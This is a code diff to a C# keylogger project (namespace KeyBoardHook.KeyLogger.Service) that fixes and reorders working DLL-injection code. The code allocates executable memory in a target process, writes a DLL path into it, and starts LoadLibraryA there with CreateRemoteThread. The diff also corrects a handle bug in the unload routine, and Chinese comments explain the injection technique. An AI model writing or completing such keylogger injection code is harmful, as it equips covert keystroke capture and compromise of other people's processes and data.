@@ -187,15 +187,21 @@ namespace KeyBoardHook.KeyLogger.Service
                 MessageBox.Show("GetProcAddress 异常");
                 return;
             }
+            
+            //取得DLL的基地址
+            // GetExitCodeThread( openProcess, &modEntry.modBaseAddr );
             var remoteThread = NativeMethods.CreateRemoteThread(openProcess, (IntPtr)null, (IntPtr)0, lpLLAddress, modEntry.modBaseAddr, 0, (IntPtr)null); 
             if (remoteThread==(IntPtr)0)
             {
                 MessageBox.Show("CreateRemoteThread 异常");
             }
             
-            NativeMethods.WaitForSingleObject(threadId, 60 * 1000);        
+            NativeMethods.WaitForSingleObject(remoteThread, 60 * 1000);        
             MessageBox.Show($@"unInjectionCDLL remoteThread {remoteThread} successful");
 
+            // 释放申请的内存
+            // VirtualFreeEx( openProcess, lpAddress, (IntPtr)sDllPath.Length + 1, MEM_RELEASE );
+            
             NativeMethods.CloseHandle(remoteThread);
             NativeMethods.CloseHandle(openProcess);
             if (flag)
@@ -220,17 +226,7 @@ namespace KeyBoardHook.KeyLogger.Service
                     return;
                 }
                     
-                // GetModuleHandle()和GetProcAddress()用来获取LoadLibrary()函数地址，进而用来调用LoadLibrary()
-                // (Unicod为LoadLibraryW，ANSI为LoadLibraryA)
-                // 使用LoadLibrary()加载某个DLL时，该DLL中的DllMain()函数会被调用执行。DLL注入的原理就是从外部促使目标进程调用LoadLibrary() API。
-                IntPtr lpLLAddress = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
-                if (lpLLAddress == IntPtr.Zero)
-                {
-                    MessageBox.Show("GetProcAddress 异常");
-                    return;
-                }
-                    
-                // 用来将DLL路径写入目标进程内存 (0x1000 | 0x2000) , 0X40
+                // 在远程进程中为 sDllPath 分配内存
                 IntPtr lpAddress = NativeMethods.VirtualAllocEx(openProcess, (IntPtr)null, (IntPtr)sDllPath.Length + 1, NativeMethods.Commit, NativeMethods.ExecuteReadWrite);
 
                 if (lpAddress == IntPtr.Zero)
@@ -240,8 +236,7 @@ namespace KeyBoardHook.KeyLogger.Service
                 }
                 // byte[] bytes = Encoding.ASCII.GetBytes(sDllPath);
                 // var writeProcessMemory = NativeMethods.WriteProcessMemory(openProcess, lpAddress, bytes, (uint)bytes.Length, 0);
-
-                // 用来将DLL路径写入分配的缓冲区
+                // 用来将 sDllPath 路径写入分配的缓冲区
                 var writeProcessMemory = NativeMethods.WriteProcessMemory(openProcess, lpAddress, sDllPath, sDllPath.Length + 1, 0);
                 if (writeProcessMemory == 0)
                 {
@@ -249,12 +244,24 @@ namespace KeyBoardHook.KeyLogger.Service
                     return;                    
                 }
 
+                // GetModuleHandle()和GetProcAddress()用来获取LoadLibrary()函数地址，进而用来调用LoadLibrary()
+                // (Unicod为LoadLibraryW，ANSI为LoadLibraryA)
+                // 使用LoadLibrary()加载某个DLL时，该DLL中的DllMain()函数会被调用执行。DLL注入的原理就是从外部促使目标进程调用LoadLibrary() API。
+                IntPtr lpLLAddress = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+                if (lpLLAddress == IntPtr.Zero)
+                {
+                    MessageBox.Show("GetProcAddress 异常");
+                    return;
+                }
+                // lpLLAddress 要执行的函数地址
+                // lpAddress 参数地址
                 var remoteThread = NativeMethods.CreateRemoteThread(openProcess, (IntPtr)null, (IntPtr)0, lpLLAddress, lpAddress, 0, (IntPtr)null); 
                 if (remoteThread==(IntPtr)0)
                 {
                     MessageBox.Show("CreateRemoteThread 异常");
                     return;       
                 }
+
                 NativeMethods.WaitForSingleObject(remoteThread, 60 * 1000);        
                 NativeMethods.CloseHandle(remoteThread);
                 NativeMethods.CloseHandle(openProcess);
